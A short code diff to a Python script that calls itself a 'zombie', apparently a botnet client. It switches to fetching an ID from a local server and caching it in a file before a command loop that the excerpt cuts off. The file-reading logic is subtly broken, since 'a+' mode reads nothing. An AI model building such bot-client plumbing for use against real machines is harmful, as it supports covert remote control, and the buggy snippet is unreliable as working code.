@@ -1,10 +1,22 @@
 from urllib.request import urlopen
 from time import sleep
-from uuid import getnode
 import uuid # this gives us the mac address of the machine as a 48 bit positive enteger
 # we use it to identify each zombie
 
-zid = "z" +str(uuid.getnode()) # because table names can't start with a number.
+
+def get_zid_from_server():
+    """get a new zid from the server"""
+    with urlopen("http://127.0.0.1:5000/getId") as httpres:
+        zid = bytes.decode(httpres.read())
+        return zid
+
+# try to read zombie id. if there is nothing to read, this must be a new zombie so request for an id
+with open('zid', 'a+') as file:
+    zid = file.read()
+    if zid == "":
+        zid = get_zid_from_server()
+        file.write(zid)
+
 
 command = ""
 while True:
